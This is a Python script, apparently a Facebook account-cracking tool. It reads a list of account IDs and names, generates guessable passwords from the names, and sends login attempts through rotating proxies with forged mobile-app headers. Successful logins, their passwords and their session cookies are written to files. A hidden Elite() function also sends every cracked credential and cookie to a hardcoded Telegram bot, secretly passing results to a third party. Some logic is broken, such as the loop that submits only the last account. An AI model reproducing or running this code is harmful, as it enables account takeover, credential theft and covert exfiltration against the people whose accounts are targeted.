try:import bs4
except ImportError:os.system('pip install bs4')
try:import rich
except ImportError:os.system('pip install rich')
try:import requests
except ImportError:os.system('pip install requests')


 #---> This is is auto requests

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python Ishmum.py')
except:
       pass

 #---> This is import for main function
import requests,os,sys,random,time,uuid,json,base64,string,pip
import platform
import urllib.parse
import urllib


 #---> This is from or inport for main function
from rich import print as prints
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from rich.panel import Panel as nel
from datetime import datetime
from rich.panel import Panel
from rich import print as cetak
from string import *
from os import path
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred

 #---> This is for auto color function 
try:
	file_color = open("assets/theme_color","r").read()
	color_rich = file_color.split("|")[0]
	color_table = file_color.split("|")[1]
except:
	color_rich = "[#afafff]"
	color_table = "#9F9F9F"
sys.stdout.write('\x1b]2; JODOHMU\x07')



 #---> This is color  code or function

merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'

SE = "[#9F9F9F]" # ABU
Z2 = "[#000000]" # BLACK
R2 = "[#FF0000]" # RED
H2 = "[#00FF00]" # GREEN
K2 = "[#FFFF00]" # YELLOW
B2 = "[#00C8FF]" # BLUE
U2 = "[#AF00FF]" # YOUNG
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # LIGHT BLUE
P2 = "[#FFFFFF]" # WHITE
J2 = "[#FF8F00]" # ORANGE
A2 = "[#AAAAAA]" # ASH-ASH
bc = '[bold cyan]'
WR = random.choice([H2,K2,B2,U2,N2,O2,J2,A2])
acakrich=random.choice([H2,K2,B2,U2,N2,O2,J2,A2])
hapus  = '[/]'
zx=[]
CY='\033[96;1m'
H='\033[96;1m' #GREEN
M='\033[1;31m' #RED
K='\033[1;33m' #YELLOW
U='\033[1;35m' #YOUNG
O='\033[38;2;255;127;0;1m' #ORANGE
B = '\x1b[1;94m' #BLUE#
C='\033[0m' #CLEAR
N = '\x1b[0m' # DEAD COLOR


 #---> This is for Globle verible
loop=0
lim=0
tp=0
oks=[]
cps=[]
pcp=[]
id=[]
 #---> This is for teligram bot  elite function
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "5406629789:AAEaSga-VmXlR_Xo73txoNqMGFGMYOYD4Rc"
        chatid = "5584436704"
        ok_id =str(ids+"|"+pas+"|"+cookie)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
 #---> This is for proxi

try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()




 #---> This is for loding menu
def logo():
	clear()
	au=f"""	
  {WR} ██▀███  ▓█████  ▒█████   ███▄ ▄███▓ ▒█████  ▓█████▄ ▒▒███████▒
  {WR}▓██ ▒ ██▒▓█   ▀ ▒██▒  ██▒▓██▒▀█▀ ██▒▒██▒  ██▒▒██▀ ██▌▒▒ ▒ ▒ ▄▀░
  {WR}▓██ ░▄█ ▒▒███   ▒██░  ██▒▓██    ▓██░▒██░  ██▒░██   █▌░ ▒░ ▒ ▄▀▒░ 
  {WR}▒██▀▀█▄  ▒▓█  ▄ ▒██   ██░▒██    ▒██ ▒██   ██░░▓█▄   ▌  ▄▀▒  ▄▀▒   ░
  {WR}░██▓ ▒██▒░▒████▒░ ████▓▒░▒██▒   ░██▒░ ████▓▒░░▒████▓ ███████▒
  {WR}░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░▒▒ ▓░▒░▒
  {WR}  ░▒ ░ ▒░ ░ ░  ░  ░ ▒ ▒░ ░  ░      ░  ░ ▒ ▒░  ░ ▒  ▒ ░░▒ ▒ ░ ▒
  {WR}  ░░   ░    ░   ░ ░ ░ ▒  ░      ░   ░ ░ ░ ▒   ░ ░  ░ ░ ░ ░ ░ ░
  {WR}   ░        ░  ░    ░ ░         ░       ░ ░     ░      ░ ░    """
	sol().print(nel(au,style=f'{color_table}',title=f'{P2}{retime()}'))
	#---> This is for loding linces 
def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}License Verification is in progress...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
    
    #---> This is for loding login
def loadinglogin():
    clear()
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Logging in Please Wait....{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")


#---> This is for bug
def BUG():
    jalan(f"㋛ Wait, the process is going to WhatsApp Admin");time.sleep(5);os.system("xdg-open https://wa.me/+6289653030972?");time.sleep(5);exit()
	
#---> This is for bug jalan function
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 

#---> This is for clear screen in termux and pc
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

#--> This is for showing time
def retime():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good morning"
	elif 12 <= hours < 15:timenow = "Good afternoon"
	elif 15 <= hours < 18:timenow = "Good afternoon"
	else:timenow = "Good night"
	return timenow
	
	#---> This is main menu
def menu():
            nama='reo'
            logo()
            prints(Panel(f"{P2}Username   :{H2}{nama}{P2}{H2}\n{P2}States     : {H2}\n{P2}Expired In : {H2}",title=f"{R2}• {K2}• {H2}•{P2} {P2}Data {H2}• {K2}• {R2}•",width=80,padding=(0,3),style=f"{color_table}"))
            prints(Panel(f"{P2}\t  \t   Welcome  {H2}{nama}{P2}  Enjoy Crack ",width=80,style=f"{color_table}"))
            prints(Panel(f"""[white][[green]01[white]]. File cloning        [white][[green]04[white]]. Random Gmail cloning [white]CP
[white][[green]02[white]]. Create file         [white][[green]05[white]]. 
[white][[green]03[white]]. Random cloning      [white][[red]06[white]]. [red]Exit """,title=f"{P2}[  Menu Options  {hapus}]",width=80,padding=(0,4),style=f"{color_table}"))
            prints(Panel(f"""\t {P2}Type {R2}Bug {P2}To Report a Script Bug""",width=80,padding=(0,7),style=f"{color_table}"))
            c=input(f'•{N} Select :{C}  ')
            if c=='':
                menu()
            elif c in ('1','01'):
                file()
            elif c in ('1','02'):
                prints(Panel(f"{P2}Crack From Name Search",width=80,padding=(0,2),style=f"{color_table}"))
            elif c in ('3','03'):
                prints()
            elif c in ('5','05'):
                prints()
            elif c in ('6','06'):
                exit(" Thanks for use my tool")
            else:          
                print(" Plese select Valid Option.......")             
                time.sleep(2)
                clear()
                menu()

#---> This is function 1
def file():
    prints(Panel(f"{P2}Put file example  :    /sdcard/File.txt  etc..",width=80,padding=(0,2),style=f"{color_table}"))
    
    file = input(' \033[1;32mPut file path\033[1;37m: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' File location not found ')
        time.sleep(1)        
        menu()
    
    
    prints(Panel(f"""
[white][[green]01[white]]. Method 1    
[white][[green]02[white]]. Method 2          
[white][[green]03[white]]. Method 3
[white][[green]04[white]]. Method 4
[white][[green]05[white]]. Method 5   """,
    title=f"{R2}• {K2}• {H2}•{P2} {P2}All method working try 1 by 1  {H2}• {K2}• {R2}•",width=80,padding=(0,4),style=f"{color_table}"))
    
    mthd = input(f'•{N} Choose :{C}  ')
    
    plist = []
    prints(Panel(f"""
[white][[green]01[white]]. Auto Password
[white][[green]02[white]]. Choice Password  """,
    title=f"{P2}[  Choose Password Type  {hapus}]",width=80,padding=(0,4),style=f"{color_table}"))
    
    psx = input(' Choose: ')
    if psx =='':
        file()
    elif psx in ['1','01']:
        plist.extend(['first last', 'firstlast', 'First123', 'first12345', '@india123', 'first123456789', 'firstlast123', 'First@123456', 'first@123', 'First@123', 'First@12345', 'india@123', '@first123', 'first123', 'last1234567'])
    elif psx in ['2','02']:
        try:
            prints(Panel(f"{P2}How many passwords do you want to add ? ",width=80,padding=(0,2),style=f"{color_table}"))              
            ps_limit = int(input('Choose: '))
        except:
            ps_limit = 1
        print('\033[1;32m exp: first last,firstlast,first123')
        
        for i in range(ps_limit):
            plist.append(input(f' Password {i+1}: '))
    
    
    prints(Panel(f"{P2}Do you want to show CP accounts? (y/n):",width=80,padding=(0,2),style=f"{color_table}"))
    
    cx = input(' Choose: ')
    
    if cx in ['y','Y','yes','Yes','1']:
        pcp.append('y')
    else:
        pcp.append('n')
    
    with tred(max_workers=30) as crack_submit:
        clear()
        total_ids = str(len(fo))
        print(' TOTAL ACCOUNT : \033[1;91m'+total_ids)
        print("\033[1;37m \x1b[38;5;208mUSE AIRPLANE MODE FOR MORE OK IDS \033[1;37m")
        
        for user in fo:
            ids, names = user.split('|')
            passlist = plist

        if mthd=='':
            file()
        elif mthd in ['1','01']:
            crack_submit.submit(M1, ids, names, passlist)
        elif mthd in ['2','02']:
            crack_submit.submit(R2, ids, names, passlist)
        elif mthd in ['3','03']:
            crack_submit.submit(M3, ids, names, passlist)
        elif mthd in ['4','04']:
            crack_submit.submit(M4, ids, names, passlist)
        else:
            crack_submit.submit(M5, ids, names, passlist)
            
                
    print('\033[1;37m')
    
    print(' The process has completed')
    print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    
    input(' Press enter to go back ')
    os.system('python reomodz.py')

#---> This is  Method 1   
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ISHMUM-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Vivo;FBBD/Vivo;FBPN/{fbpn};FBDV/V2024A;FBSV/13;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"ex_MX","client_country_code":"MX",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,proxies=proxs,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [ISHMUM-OK] '+ids+' | '+pas+'\033[1;97m')                                        
                                        open('/sdcard/ISHMUM_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ISHMUM_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ISHMUM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [ISHMUM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ISHMUM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/ISHMUMbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass


#---> This is for call main faction
def main():
    menu()
#---> This is for call main faction to start 
main()